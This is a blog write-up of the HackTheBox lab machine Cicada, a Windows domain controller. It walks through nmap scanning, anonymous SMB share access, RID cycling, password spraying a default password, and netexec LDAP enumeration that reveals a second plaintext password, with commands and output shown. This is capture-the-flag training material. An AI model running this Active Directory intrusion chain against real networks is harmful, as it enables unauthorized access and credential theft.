+++
date = '2026-04-20T21:46:02-04:00'
draft = false
author = 'Siddhant Singh'
title = 'Cicada'
+++

Cicada is an easy-rated Windows box on HackTheBox. It's a domain controller, and the path is a pretty classic AD chain — null session SMB enumeration turns up a default password left in an HR share, RID cycling gives a full user list, password spraying lands the first account, and then a credential hiding in a user's LDAP description field hands over a second account with more access. From there it's a short trip into Bloodhound to map out the rest of the path.

**Target:** `10.10.11.35`  
**My IP:** `10.10.14.2`

---

## Enumeration

### NMAP

Used my [NMAP oneliner](https://github.com) — first a fast full-port scan to find everything open, then feed the results into a targeted `-sC -sV` run.

```
nmap -sC -sV -p$(nmap -p- -Pn 10.10.11.35 | grep "/tcp\|/udp" | cut -d"/" -f1 | tr "\n" ", ") 10.10.11.35
```

```
─$ nmap -sC -sV -p$(nmap -p- -Pn 10.10.11.35 | grep "/tcp\|/udp" | cut -d"/" -f1 | tr "\n" ", ") 10.10.11.35
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 19:31 EDT
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 38.46% done; ETC: 19:31 (0:00:11 remaining)
Nmap scan report for 10.10.11.35
Host is up (0.031s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-04 06:31:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
56683/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m01s
| smb2-time: 
|   date: 2025-06-04T06:32:12
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.53 seconds
```

The port spread makes this obviously an Active Directory domain controller — DNS (53), Kerberos (88), LDAP (389/636/3268/3269), RPC, SMB (445), and WinRM (5985). The cert on LDAP confirms the domain: `cicada.htb` and DC hostname `CICADA-DC.cicada.htb`. Added both to `/etc/hosts`.

---

## SMB — Null Session Enumeration

With SMB open and an AD target in front of me, the first thing to try is a null session to see what shares are accessible without credentials. There's a solid reference for this kind of enumeration over at [0xdf's SMB cheatsheet](https://0xdf.gitlab.io/cheatsheets/smb-enum).

```

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
```

`ADMIN$` and `C$` are locked down as expected, but `HR` and `DEV` stood out as non-standard. `HR` was readable anonymously, and inside it was a file containing a default onboarding password:

```
Cicada$M6Corpb*@Lp#nZp!8
```

That's a default password waiting to be sprayed against a user list. The next step was building that user list.

### RID Cycling

I used RID cycling via `netexec` to enumerate domain users from the null session. RID cycling works by iterating through Security Identifier (SID) relative IDs — since domain user SIDs are predictable (`DOMAIN-SID-RID`), you can brute-force the RID range to enumerate accounts even without credentials.

```
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```

Pulled out the non-default user accounts into a working list:

```
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

### Password Spray

With a user list and the default password from the HR share, I sprayed the password against LDAP using `netexec`. `michael.wrightson` came back as a hit.

---

## Foothold — Authenticated LDAP Enumeration

With `michael.wrightson` and the password, I moved on to authenticated LDAP enumeration. Running `netexec` against LDAP with `--users` dumps the domain user list including their description fields — and admins sometimes leave credentials there.

```
netexec ldap 10.10.11.35 -d cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

```
└─$ netexec ldap 10.10.11.35 -d cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)                                                                          
LDAP        10.10.11.35     389    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
LDAP        10.10.11.35     389    CICADA-DC        [*] Enumerated 8 domain users: cicada.htb
LDAP        10.10.11.35     389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                               
LDAP        10.10.11.35     389    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain                                                                   
LDAP        10.10.11.35     389    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain                                                                 
LDAP        10.10.11.35     389    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account     
LDAP        10.10.11.35     389    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 0                                                   
LDAP        10.10.11.35     389    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 0                                                   
LDAP        10.10.11.35     389    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0                      
LDAP        10.10.11.35     389    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3                                                                      
LDAP        10.10.11.35     389    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0      
```

`david.orelious` had his password sitting in the description field in plain text:

```
david.orelious : aRt$Lp#7t*VQ!3
```

This is a really common misconfiguration in AD environments — the description field is readable by any authenticated user, so people shouldn't be storing anything sensitive there. Noted for future enumeration checklists.

---

## Bloodhound

With `david.orelious` in hand, I ran Bloodhound to collect AD data and map out the domain. David's account presumably has some level of elevated access — likely related to the `DEV` share and the `Dev Support` group spotted during RID cycling — so the next step is letting Bloodhound figure out what attack paths are available from here.
